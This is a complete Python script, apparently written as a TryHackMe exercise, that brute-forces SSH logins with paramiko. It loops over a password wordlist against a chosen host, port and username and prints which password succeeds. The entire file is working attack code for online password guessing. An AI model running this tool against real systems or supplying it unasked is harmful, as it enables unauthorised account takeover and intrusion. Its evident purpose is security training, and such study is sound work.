"""
sshlogin - an ssh login brute-force

Based on sample code from
https://tryhackme.com/room/pythonforcybersecurity
"""


import argparse
import paramiko


def ssh_connect(target, port, username, password):
    """
    Initialize an SSH client,
    try to connect with the given username and password,
    and return a success result, true or false.
    """

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success = False

    try:
        ssh.connect(target, port, username=username, password=password)
        success = True
    except paramiko.AuthenticationException:
        success = False

    ssh.close()
    return success


def main():
    """
    Set up arguments, open the wordlist to be used for password checking,
    and call the ssh_connect() function.
    """

    parser = argparse.ArgumentParser()

    parser.add_argument(
            "-t", "--target", help="the host IP number")

    parser.add_argument(
            "-p", "--port", help="the host portnumber",
            default=22, required=False)

    parser.add_argument(
            "-u", "--username", help="the username")

    parser.add_argument(
            "-w", "--wordlist", help="a password wordlist file")

    args = parser.parse_args()

    with open(args.wordlist, 'r', encoding="utf-8", errors="ignore") as file:
        for line in file:
            password = line.strip()

            try:
                success = ssh_connect(
                        args.target, args.port, args.username, password)

                if success:
                    print(f"[+] {password}")
                else:
                    print(f"[-] {password}")

            # pylint: disable=broad-exception-caught
            except Exception as e:
                print(e)


if __name__ == "__main__":
    main()
